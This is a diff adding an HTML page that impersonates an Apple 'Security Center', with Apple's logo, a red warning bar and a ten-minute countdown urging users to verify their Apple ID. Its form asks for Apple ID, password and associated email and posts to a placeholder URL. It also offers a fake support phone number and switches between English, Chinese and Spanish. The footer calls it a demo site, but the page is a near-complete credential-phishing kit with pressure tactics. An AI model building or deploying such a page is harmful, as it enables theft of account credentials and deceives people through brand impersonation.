@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apple Security Center</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "San Francisco", Helvetica, Arial, sans-serif;
+    background-color: #f5f5f7;
+    color: #1d1d1f;
+}
+/* 顶部导航栏 */
+.navbar {
+    background-color: #000;
+    color: #fff;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 12px 20px;
+    font-size: 14px;
+}
+.nav-left, .nav-right { display: flex; align-items: center; }
+.nav-left svg { margin-right: 12px; }
+.navbar a { color: #fff; text-decoration: none; margin: 0 12px; opacity: 0.8; }
+.navbar a:hover { opacity: 1; }
+#languageSelect { padding: 5px 8px; border-radius: 6px; border: none; font-size: 14px; cursor: pointer; }
+/* 警告条 */
+.warning {
+    background: linear-gradient(90deg,#ff3b30,#ff5e5e);
+    color: white;
+    padding: 18px;
+    font-size: 18px;
+    font-weight: 700;
+    text-align: center;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+}
+.warning span { font-size: 22px; margin-right: 10px; }
+.progress-container { position: absolute; bottom: 0; left: 0; width: 100%; height: 5px; background: rgba(255,255,255,0.3); border-radius: 0 0 4px 4px; }
+.progress-bar { height: 5px; width: 100%; background: #fff; border-radius: 0 0 4px 4px; transition: width 1s linear; }
+/* 表单容器 */
+.form-container {
+    max-width: 500px;
+    margin: 50px auto;
+    padding: 30px;
+    background-color: #fff;
+    border-radius: 12px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+}
+.form-container h2 {
+    font-weight: 600;
+    text-align: center;
+    margin-bottom: 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 22px;
+}
+.form-container h2 svg { width: 24px; height: 24px; margin-right: 10px; }
+.form-container p { text-align: center; color: #6e6e73; font-size: 14px; }
+input[type="text"], input[type="password"], input[type="email"] {
+    width: 100%; padding: 12px; margin: 12px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px;
+}
+input[type="submit"] {
+    width: 100%; background-color: #0071e3; color: white; padding: 14px;
+    border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
+    cursor: pointer; box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    transition: background-color 0.3s ease;
+}
+input[type="submit"]:hover { background-color: #005bb5; }
+/* 客服电话提示 */
+.customer-support {
+    text-align: center;
+    margin: 20px auto;
+    font-family: -apple-system, BlinkMacSystemFont, "San Francisco", Helvetica, Arial, sans-serif;
+    font-size: 16px;
+    color: #1d1d1f;
+    max-width: 400px;
+    padding: 15px 20px;
+    border-radius: 8px;
+    background-color: #f5f5f7;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+}
+/* 页脚 */
+.footer { text-align: center; margin: 30px 0; font-size: 12px; color: #6e6e73; }
+</style>
+</head>
+<body>
+
+<!-- 顶部导航栏 -->
+<div class="navbar">
+    <div class="nav-left">
+        <!-- 官方 Apple Logo SVG -->
+        <svg viewBox="0 0 1024 1024" width="18" height="18" fill="#fff">
+            <path d="M814.9 473.1c-0.3-87.5 71.6-129.7 74.8-131.7-41-59.9-104.7-68.1-127.3-69.1-54.3-5.5-105.9 32.2-133.3 32.2-27.4 0-70.1-31.5-115.3-30.7-59 0.8-113.6 34.3-143.7 87-61.2 105.6-15.6 261.2 43.9 346.6 29.1 42.5 63.6 90.2 109 88.4 42.9-1.7 59.1-27.9 110.8-27.9 51.7 0 66.7 27.9 111.6 27 45-0.9 73.2-43.4 102.4-85.9 32.2-47.3 45.6-93 46.2-95.4-1-0.5-88.3-34-88.6-134.6zM675.7 184.5c24.2-29.5 40.5-70.5 36-111.1-34.9 1.4-77.3 23.2-102.1 52.7-22.3 26.2-41.7 68-36.5 107.3 38.6 3 78.1-19.6 102.6-49z"/>
+        </svg>
+        <a href="#">Mac</a>
+        <a href="#">iPad</a>
+        <a href="#">iPhone</a>
+        <a href="#">Watch</a>
+        <a href="#">Support</a>
+    </div>
+    <div class="nav-right">
+        <select id="languageSelect">
+            <option value="en">English</option>
+            <option value="zh">中文</option>
+            <option value="es">Español</option>
+        </select>
+    </div>
+</div>
+
+<!-- 警告条 -->
+<div class="warning" id="warningBar">
+    <span>⚠️</span> <span id="warningText">Your Apple ID must be verified within <span id="timer">10:00</span> minutes.</span>
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+</div>
+
+<!-- 表单 -->
+<div class="form-container">
+    <h2>
+        <svg viewBox="0 0 1024 1024" width="24" height="24" fill="#000">
+            <path d="M814.9 473.1c-0.3-87.5 71.6-129.7 74.8-131.7-41-59.9-104.7-68.1-127.3-69.1-54.3-5.5-105.9 32.2-133.3 32.2-27.4 0-70.1-31.5-115.3-30.7-59 0.8-113.6 34.3-143.7 87-61.2 105.6-15.6 261.2 43.9 346.6 29.1 42.5 63.6 90.2 109 88.4 42.9-1.7 59.1-27.9 110.8-27.9 51.7 0 66.7 27.9 111.6 27 45-0.9 73.2-43.4 102.4-85.9 32.2-47.3 45.6-93 46.2-95.4-1-0.5-88.3-34-88.6-134.6zM675.7 184.5c24.2-29.5 40.5-70.5 36-111.1-34.9 1.4-77.3 23.2-102.1 52.7-22.3 26.2-41.7 68-36.5 107.3 38.6 3 78.1-19.6 102.6-49z"/>
+        </svg>
+        <span id="formTitle">Apple Security Login</span>
+    </h2>
+    <p id="formDesc">Enter your Apple ID and password to continue</p>
+
+    <form action="fake-url-to-submit" method="POST">
+        <input type="text" name="apple_id" placeholder="Apple ID" required>
+        <input type="password" name="password" placeholder="Apple ID Password" required>
+        <input type="email" name="email" placeholder="Associated Email" required>
+        <input type="submit" value="Verify Now" id="submitBtn">
+    </form>
+</div>
+
+<!-- 客服电话提示 -->
+<div class="customer-support">
+    If unable to process, please call <strong>123456789</strong> for customer support
+</div>
+
+<div class="footer">
+    <p>Copyright © 2025 Apple Inc. All rights reserved. (Demo Site)</p>
+</div>
+
+<script>
+// 倒计时
+let time = 10 * 60;
+const timerElement = document.getElementById("timer");
+const progressBar = document.getElementById("progressBar");
+const warningBar = document.getElementById("warningBar");
+
+function updateTimer() {
+    let minutes = Math.floor(time / 60);
+    let seconds = time % 60;
+    timerElement.textContent = String(minutes).padStart(2,'0') + ":" + String(seconds).padStart(2,'0');
+    progressBar.style.width = (time / (10*60) * 100) + "%";
+    if(time <= 0){
+        clearInterval(countdown);
+        warningBar.innerHTML = "⚠️ Session expired. Please refresh the page.";
+    } else {
+        time--;
+    }
+}
+const countdown = setInterval(updateTimer, 1000);
+updateTimer();
+
+// 多语言切换
+const languageSelect = document.getElementById("languageSelect");
+languageSelect.addEventListener("change", function(){
+    const lang = this.value;
+    if(lang==="en"){
+        document.getElementById("warningText").textContent = "Your Apple ID must be verified within " + timerElement.textContent + " minutes.";
+        document.getElementById("formTitle").textContent = "Apple Security Login";
+        document.getElementById("formDesc").textContent = "Enter your Apple ID and password to continue";
+        document.getElementById("submitBtn").value = "Verify Now";
+    } else if(lang==="zh"){
+        document.getElementById("warningText").textContent = "您的 Apple ID 需要在 " + timerElement.textContent + " 分钟内验证。";
+        document.getElementById("formTitle").textContent = "Apple 安全登录";
+        document.getElementById("formDesc").textContent = "请输入您的 Apple ID 和密码以继续";
+        document.getElementById("submitBtn").value = "立即验证";
+    } else if(lang==="es"){
+        document.getElementById("warningText").textContent = "Su Apple ID debe verificarse dentro de " + timerElement.textContent + " minutos.";
+        document.getElementById("formTitle").textContent = "Inicio de sesión de seguridad Apple";
+        document.getElementById("formDesc").textContent = "Ingrese su Apple ID y contraseña para continuar";
+        document.getElementById("submitBtn").value = "Verificar ahora";
+    }
+});
+</script>
+
+</body>
+</html>
+
